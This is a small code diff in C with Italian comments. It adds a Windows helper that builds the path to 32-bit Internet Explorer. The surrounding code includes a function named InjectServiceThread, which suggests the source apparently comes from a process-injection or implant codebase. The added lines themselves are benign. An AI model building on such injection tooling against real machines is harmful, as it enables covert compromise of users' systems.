@@ -2213,6 +2213,16 @@ BOOL HM_GetDefaultBrowser(char *path_name)
 	return TRUE;
 }
 
+// Prende il path di IE32
+BOOL HM_GetIE32Browser(char *path_name)
+{
+	if (GetEnvironmentVariableA("ProgramFiles(x86)", path_name, DLLNAMELEN) == 0)
+		return FALSE;
+
+	StrCat(path_name, "\\Internet Explorer\\iexplore.exe");
+	return TRUE;
+}
+
 DWORD WINAPI InjectServiceThread(DWORD dummy)
 {
 	DWORD service_pid;
